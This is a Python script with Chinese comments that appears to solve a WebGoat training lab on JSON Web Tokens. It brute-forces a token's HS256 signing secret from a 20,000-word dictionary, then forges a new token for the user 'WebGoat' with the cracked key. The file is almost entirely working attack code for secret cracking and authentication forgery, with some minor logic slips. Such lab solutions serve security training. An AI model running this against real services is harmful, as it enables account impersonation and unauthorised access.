# -*- coding: utf-8 -*-

# for python3

from collections import OrderedDict
import jwt
import base64

# 从jwt中解析出payload
def getPayloadFromJwt(data):
	payloadBase64 = data.split('.')[1]
	fix = 4 - len(payloadBase64) % 4
	return base64.b64decode(payloadBase64 + '=' * fix)
	
# 遍历字典，爆破salt值	
def bruteGetSalt(payload, list, jwtStr, alg = 'HS256'):
	for i in range(0, len(list)):
		newJwt = jwt.encode(payload, list[i], algorithm = alg)
		if newJwt == oldJwt:
			break			
	if i < len(list):
		return list[i]
	else:
		return 'no salt found'

if __name__ == '__main__':
	# 构造payload并爆破出salt值
	payload = OrderedDict()
	payload['iss'] = 'WebGoat Token Builder'
	payload['iat'] = 1524210904
	payload['exp'] = 1618905304
	payload['aud'] = 'webgoat.org'
	payload['sub'] = 'tom@webgoat.com'
	payload['username'] = 'Tom'
	payload['Email'] = 'tom@webgoat.com'
	payload['Role'] = ('Manager', 'Project Administrator')
	oldJwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM'
	dictPath = r'F:\ctf\WebGoat\data\google-10000-english-master\20k.txt'
	with open(dictPath, 'r') as f:
		list = f.readlines()
	for i in range(0, len(list)):
		list[i] = list[i][:-1]
	salt = bruteGetSalt(payload, list, oldJwt)
	print('salt is ' + salt)

	# 根据salt值计算目标jwt
	payload['username'] = 'WebGoat'
	newJwt = jwt.encode(payload, salt, algorithm = 'HS256')
	print('jwt is ' + newJwt)

	# 从目标jwt中解析出payload
	jsonPayload = getPayloadFromJwt(newJwt)
	print('payload is ' + jsonPayload)